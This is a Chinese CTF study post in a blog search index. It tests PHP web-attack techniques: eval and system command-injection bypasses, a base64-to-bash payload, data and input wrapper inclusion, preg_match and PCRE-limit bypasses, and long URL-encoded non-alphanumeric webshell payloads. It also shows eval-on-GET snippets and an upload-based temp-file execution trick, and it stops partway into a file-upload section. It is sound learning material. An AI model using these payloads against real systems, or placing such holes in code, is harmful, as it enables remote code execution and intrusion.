<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>读Boogipop新人同学</title>
    <link href="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/"/>
    <url>/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="读Boogipop大佬文章的具体尝试"><a href="#读Boogipop大佬文章的具体尝试" class="headerlink" title="读Boogipop大佬文章的具体尝试"></a>读Boogipop大佬文章的具体尝试</h1><h2 id="1-关于eval和system-（只尝试了php7-3-4）"><a href="#1-关于eval和system-（只尝试了php7-3-4）" class="headerlink" title="1.关于eval和system   （只尝试了php7.3.4）"></a>1.关于eval和system   （只尝试了php7.3.4）</h2><p>eval常规执行命令形如<code>eval(system(&#39;whoami&#39;););</code></p><p>当然不能直接这样运行，<code>system(&#39;whoami&#39;);</code>是传参进去的  （记得带<code>;</code>号）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#大佬给出的绕过技巧</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-meta">?&gt;</span>)<br><span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span>)<br><span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span>;)<br><span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>)<br><span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span>;)<br></code></pre></td></tr></table></figure><h3 id="在拼接的情况下执行命令"><a href="#在拼接的情况下执行命令" class="headerlink" title="在拼接的情况下执行命令"></a>在拼接的情况下执行命令</h3><h4 id="eval-中的参数被拼接"><a href="#eval-中的参数被拼接" class="headerlink" title="eval()中的参数被拼接"></a>eval()中的参数被拼接</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;#&#x27;</span>.$_GET[<span class="hljs-string">&#x27;c&#x27;</span>])<span class="hljs-comment">;</span><br><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;asd&#x27;</span>.$_GET[<span class="hljs-string">&#x27;c&#x27;</span>])<span class="hljs-comment">;</span><br><span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;c&#x27;</span>].<span class="hljs-string">&quot;asd&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel">第一种: 注释考虑换行绕过      payload:?c=%0asystem(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>第二种: 考虑分割(; | &amp;)      payload:?c=;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>第三种: 考虑注释后面内容      payload:?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-comment">//</span><br>                          payload:?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);__HALT_COMPILER();<br></code></pre></td></tr></table></figure><h4 id="system-中的拼接"><a href="#system-中的拼接" class="headerlink" title="system()中的拼接"></a>system()中的拼接</h4><p>好像换行注释什么的都不行，只考虑命令拼接符</p><p>以下是个人尝试得出的结论，和网上的不同（有可能是windows环境的原因）(感觉我的都是歪理，其实有些地方也自相矛盾)</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">;   理论上做题应该是万能的，但在本地尝试的时候,一点作用都没有<br>|<span class="hljs-string">   只输出最后一个</span>|<span class="hljs-string">后的命令，若前面有一个命令是错误的，则无法执行</span><br><span class="hljs-string"></span>||<span class="hljs-string">  只执行</span>||<span class="hljs-string">前的命令，后面的命令错误不影响执行，若</span>||<span class="hljs-string">前的命令是错误的，后面的仍无法执行,     若前面的命令是curl、net(可能是没有输出结果的指令),就能够执行</span>||<span class="hljs-string">后面的语句</span><br><span class="hljs-string"></span><br><span class="hljs-string">&amp;   命令都正确时，都可以执行，后面的错了，前面的能执行，前面的错了，都不能执行</span><br><span class="hljs-string">&amp;&amp;  命令都正确时，都可以执行，后面的错了，前面的能执行，前面的错了，都不能执行</span><br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;ls -all &quot;</span>.$this-&gt;filename);     <span class="hljs-comment">#DASCTF2023&amp;0X401比赛题</span><br><span class="hljs-keyword">system</span>($_GET[<span class="hljs-string">&#x27;file&#x27;</span>].<span class="hljs-string">&quot;aksldj&quot;</span>);<br><span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;curl &quot;</span>.$_GET[<span class="hljs-string">&#x27;url&#x27;</span>].<span class="hljs-string">&quot;.dnslog.cn&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment">#由于;我无法尝试，此处不讨论;能否使用</span><br><br>第一个: 大佬payload: ;echo bHMgLwo|<span class="hljs-string">base64 -d</span>|<span class="hljs-string">bash;    题目复现过，是可行的</span><br><span class="hljs-string">第二个: </span>||<span class="hljs-string">  &amp;  &amp;&amp; 三个都能使用</span><br><span class="hljs-string">第三个: 由于是curl,前面可以使用</span>||<span class="hljs-string">(直接</span>|<span class="hljs-string">也行),后面</span>||<span class="hljs-string">  &amp;  &amp;&amp; 三个都能使用</span><br></code></pre></td></tr></table></figure><h2 id="data协议和input协议与include和highlight-file"><a href="#data协议和input协议与include和highlight-file" class="headerlink" title="data协议和input协议与include和highlight_file"></a>data协议和input协议与include和highlight_file</h2><blockquote><p>data协议条件</p><ul><li>allow_url_fopen:on</li><li>allow_url_include :on</li></ul><p>input协议条件</p><ul><li>allow_url_fopen:随便</li><li>allow_url_include :on</li></ul></blockquote><p>关于include能执行命令，我是模糊的，一直到2023SCTF的<code>fumo_backdoor</code>（与2022CISCN的考点相同），他们之间的区别是一个是include、一个是highlight_file（与题目的考点无关，但确实会对题目中的操作有影响），我在复现时看文章能写木马，但复现却不行，问了<code>unknown</code>师傅才知道，能执行代码完全靠的是<code>include</code>的函数，而<code>highlight_file</code>这类的就完全不行！</p><p><code>include</code>能配合<code>data</code>、<code>input</code>伪协议进行命令执行，而<code>highlight_file</code>显示代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901162551316.png" alt="image-20230901162551316"></p><h3 id="filter协议就不说了"><a href="#filter协议就不说了" class="headerlink" title="filter协议就不说了"></a>filter协议就不说了</h3><h3 id="Boogipop大佬总结"><a href="#Boogipop大佬总结" class="headerlink" title="Boogipop大佬总结"></a>Boogipop大佬总结</h3><p>所谓的什么伪协议流，其实就是读取文件或者写入内容到文件，并且储存到变量里面<br>不要搞混了哦</p><h2 id="preg-match误区"><a href="#preg-match误区" class="headerlink" title="preg_match误区"></a>preg_match误区</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$str</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^flag/i&#x27;</span>, <span class="hljs-variable">$str</span>))&#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;yes&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901170008293.png" alt="image-20230901170008293"></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901165657391.png" alt="image-20230901165657391"></p><p>完了，为什么啊，与大佬结果不一样，（我测试了7.3.4和7.0.9和5.6.9三个版本都不回显）</p><h3 id="m修饰符"><a href="#m修饰符" class="headerlink" title="m修饰符"></a>m修饰符</h3><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901171700257.png" alt="image-20230901171700257"></p><p><code>m</code>是一定要搭配<code>^</code>或者<code>$</code>来使用的，匹配的是**<code>每一行</code>**的开头或结尾</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(preg_match(<span class="hljs-string">&#x27;/^flag/im&#x27;</span>, <span class="hljs-variable">$str</span>)</span></span>)&#123;<br></code></pre></td></tr></table></figure><p>所以无法用%0a进行绕过</p><h3 id="preg-match的绕过技巧"><a href="#preg-match的绕过技巧" class="headerlink" title="preg_match的绕过技巧"></a>preg_match的绕过技巧</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (preg_match(<span class="hljs-string">&#x27;/^flag$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>    <span class="hljs-attribute">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>?a=flag%0a</code></p><h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><h4 id="PCRE回溯次数限制绕过"><a href="#PCRE回溯次数限制绕过" class="headerlink" title="PCRE回溯次数限制绕过"></a>PCRE回溯次数限制绕过</h4><p>一般是写脚本上传超过1000000的数据，就会被绕过</p><h5 id="新了解的方法"><a href="#新了解的方法" class="headerlink" title="新了解的方法"></a>新了解的方法</h5><p><code>.htaccess</code>文件设置pcre回溯次数</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">php_value</span> pcre.backtrack_limit <span class="hljs-number">0</span><br><span class="hljs-attribute">php_value</span> pcre.jit <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>将正则匹配的回溯次数设为0，来达到绕过的效果</p><h4 id="限制次数绕过"><a href="#限制次数绕过" class="headerlink" title="限制次数绕过"></a>限制次数绕过</h4><p><code>preg_match(&#39;/[0-9a-zA-Z]&#123;2&#125;/&#39;,$p) === 1</code>（匹配到两次）</p><p>每一个字符前加上单引号可以绕过preg_match的匹配：                                      </p><p>payload：<code>p=&#39;Z&#39;m&#39;x&#39;h&#39;Z&#39;y&#39;5&#39;w&#39;a&#39;H&#39;A&#39;=</code></p><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h2><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901174857243.png" alt="image-20230901174857243"></p><p>根据<code>&amp;</code>解析变量</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs zephir">parse_str(<span class="hljs-string">&quot;a=1%26b=2%26c=3&quot;</span>);     <span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;1&amp;b=2&amp;c=3&#x27;</span><br><br>parse_str(<span class="hljs-string">&quot;a=1&amp;b=2&amp;c=3&quot;</span>);<br><span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-string">&#x27;c&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;3&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>取反、异或都需要php7的环境（确实好像php5用不了）</p><h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>大佬给出的异或脚本真好用，嘿嘿</p><h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><p>php取反很方便</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h4><p><code>[].[]</code>返回ArrayArray          <code>_/_</code>返回NAN</p><p>由此自增构造字符</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$%</span><span class="hljs-variable constant_">DF</span>=(_/_._)[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;_&#x27;</span>];<span class="hljs-regexp">//</span><span class="hljs-variable constant_">NAN</span><br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DF</span>;    <span class="hljs-regexp">//</span>O<br><span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>=_;     <span class="hljs-regexp">//</span>_<br><span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>.=++<span class="hljs-variable">$_</span>.<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DF</span>;   <span class="hljs-regexp">//</span>_P<br><span class="hljs-variable">$_</span>++;   <span class="hljs-regexp">//</span>Q<br><span class="hljs-variable">$_</span>++;    <span class="hljs-regexp">//</span>R<br><span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>.=++<span class="hljs-variable">$_</span>;   <span class="hljs-regexp">//</span>_POS<br><span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>.=++<span class="hljs-variable">$_</span>;   <span class="hljs-regexp">//</span>_POST<br><span class="hljs-variable">$$</span>%<span class="hljs-variable constant_">DE</span>[__](<span class="hljs-variable">$$</span>%<span class="hljs-variable constant_">DE</span>[_]);  <span class="hljs-regexp">//</span><span class="hljs-variable">$_POST</span>[__](<span class="hljs-variable">$_POST</span>[_])<br></code></pre></td></tr></table></figure><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mel">#Boogipop大佬自增的结果<br><br>%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b<br><span class="hljs-comment">//$_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]);</span><br><br><br><br><span class="hljs-comment">//ASSERT($_POST[_]);   php小于7</span><br>%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b%27!%27%3d%3d%27%40%27%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d%27_%27%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b<br></code></pre></td></tr></table></figure><h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><p><code>?</code>    <code>*</code></p><h2 id="缓存文件"><a href="#缓存文件" class="headerlink" title="缓存文件"></a>缓存文件</h2><p><code>/tmp/phpxxxxxx</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br></code></pre></td></tr></table></figure><p>文件上传后首先会保存为临时文件<code>/tmp/phpxxxxxx</code></p><p>执行该文件</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>md=<span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`. /tmp/phpxxxxxx`</span><br></code></pre></td></tr></table></figure><h3 id="2023cnss新生赛"><a href="#2023cnss新生赛" class="headerlink" title="2023cnss新生赛"></a>2023cnss新生赛</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment">#door.php</span><br><br>&lt;<span class="hljs-string">?=</span>. /<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br></code></pre></td></tr></table></figure><p>在door.php路由下上传php文件</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">------WebKitFormBoundaryQe3H2A18XpuKlHGT</span><br>Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;1.php&quot;<br>Content-<span class="hljs-keyword">Type</span>: application/octet-stream<br><br>#!/bin/bash<br>ls<br><span class="hljs-comment">------WebKitFormBoundaryQe3H2A18XpuKlHGT</span><br>Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;;<br><br>提交<br><span class="hljs-comment">------WebKitFormBoundaryQe3H2A18XpuKlHGT--</span><br></code></pre></td></tr></table></figure><h2 id="pathinfo-漏洞"><a href="#pathinfo-漏洞" class="headerlink" title="pathinfo()漏洞"></a>pathinfo()漏洞</h2><p><code>/</code>获取文件名，根据<code>.</code>获取文件后缀</p><p><code>1.php/.</code></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901212548383.png" alt="image-20230901212548383"></p><h2 id="parse-url解析漏洞"><a href="#parse-url解析漏洞" class="headerlink" title="parse_url解析漏洞"></a>parse_url解析漏洞</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs scss">php parse_url<br>最后一个@后的为host<br><br>libcurl<br>第一个@后的host<br><br><span class="hljs-attribute">http</span>://<span class="hljs-attribute">u</span>:p<span class="hljs-keyword">@a</span>.<span class="hljs-attribute">com</span>:<span class="hljs-number">80</span><span class="hljs-keyword">@b</span>.com/<br><br>php解析结果：<br>    <span class="hljs-attribute">schema</span>: http <br>    <span class="hljs-attribute">host</span>: b.com<br>    <span class="hljs-attribute">user</span>: u<br>    <span class="hljs-attribute">pass</span>: p<span class="hljs-keyword">@a</span>.<span class="hljs-attribute">com</span>:<span class="hljs-number">80</span><br>libcurl解析结果：<br>    <span class="hljs-attribute">schema</span>: http<br>    <span class="hljs-attribute">host</span>: a.com<br>    <span class="hljs-attribute">user</span>: u<br>    <span class="hljs-attribute">pass</span>: p<br>    <span class="hljs-attribute">port</span>: <span class="hljs-number">80</span><br>    后面的<span class="hljs-keyword">@b</span>.com/会被忽略掉<br></code></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="finfo-open-（检查文件头，十六进制第一行信息）"><a href="#finfo-open-（检查文件头，十六进制第一行信息）" class="headerlink" title="finfo_open  （检查文件头，十六进制第一行信息）"></a>finfo_open  （检查文件头，十六进制第一行信息）</h3><p>修改后缀不起作用</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs lsl">finfo_open的参数   控制返回结果<br><br>FILEINFO_NONE (<span class="hljs-type">integer</span>)<br>无特殊处理。<br>FILEINFO_SYMLINK (<span class="hljs-type">integer</span>)<br>跟随符号链接。<br>FILEINFO_MIME_TYPE (<span class="hljs-type">integer</span>)<br>返回 mime 类型。 自 PHP <span class="hljs-number">5.3</span><span class="hljs-number">.0</span> 可用。<br>FILEINFO_MIME_ENCODING (<span class="hljs-type">integer</span>)<br>返回文件的 mime 编码。 自 PHP <span class="hljs-number">5.3</span><span class="hljs-number">.0</span> 可用。<br>FILEINFO_MIME (<span class="hljs-type">integer</span>)<br>按照 RFC <span class="hljs-number">2045</span> 定义的格式返回文件 mime 类型和编码。<br>FILEINFO_COMPRESS (<span class="hljs-type">integer</span>)<br>解压缩压缩文件。 